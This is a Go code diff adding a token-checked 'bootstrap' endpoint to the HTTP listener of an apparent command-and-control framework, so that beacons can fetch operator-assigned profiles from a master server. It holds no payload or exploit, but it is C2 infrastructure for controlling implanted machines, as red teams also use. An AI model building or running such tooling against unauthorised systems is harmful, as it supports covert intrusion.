@@ -242,6 +242,13 @@ func (l *HTTPListener) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	// A beacon fetching the profile an operator just attached to it arrives here
+	// before it has a profile-shaped request: the path is the hand-off path, not a
+	// task/result URI. Answer it first.
+	if l.serveBootstrap(w, r) {
+		return
+	}
+
 	clientIP := remoteIP(r)
 
 	// Rate limit before any parsing so a flood costs as little as possible.
@@ -523,4 +530,57 @@ func remoteIP(r *http.Request) string {
 		return r.RemoteAddr
 	}
 	return host
+}
+
+// bootstrapPathDefault is where profiles are handed out unless the profile says
+// otherwise. Short on purpose: the path travels inside a task string.
+const bootstrapPathDefault = "/_p"
+
+// serveBootstrap answers a profile hand-off request and reports whether it handled
+// it. The beacon holds only a single-use token; the listener resolves it against
+// Archon with its own credentials, so a valid token is the only thing that can
+// produce a profile.
+func (l *HTTPListener) serveBootstrap(w http.ResponseWriter, r *http.Request) bool {
+	profile := l.currentProfile()
+	path := bootstrapPathDefault
+	if profile != nil && strings.TrimSpace(profile.BootstrapPath) != "" {
+		path = profile.BootstrapPath
+		if !strings.HasPrefix(path, "/") {
+			path = "/" + path
+		}
+	}
+	if r.URL.Path != path {
+		return false
+	}
+
+	token := strings.TrimSpace(r.URL.Query().Get("t"))
+	if token == "" {
+		token = strings.TrimSpace(r.URL.Query().Get("token"))
+	}
+	if token == "" {
+		token = strings.TrimSpace(r.Header.Get("X-Bootstrap-Token"))
+	}
+	if token == "" {
+		http.Error(w, "token required", http.StatusBadRequest)
+		return true
+	}
+
+	if l.c2 == nil || masterClient == nil {
+		http.Error(w, "listener is not connected to a master", http.StatusServiceUnavailable)
+		return true
+	}
+
+	payload, err := masterClient.FetchBootstrapProfile(token)
+	if err != nil {
+		logf("[HTTP] bootstrap rejected for %s: %v", remoteIP(r), err)
+		http.Error(w, "invalid or expired token", http.StatusNotFound)
+		return true
+	}
+
+	logf("[HTTP] bootstrap profile handed to %s", remoteIP(r))
+	w.Header().Set("Content-Type", "application/json")
+	w.Header().Set("Cache-Control", "no-store")
+	w.WriteHeader(http.StatusOK)
+	_, _ = w.Write([]byte(payload))
+	return true
 }
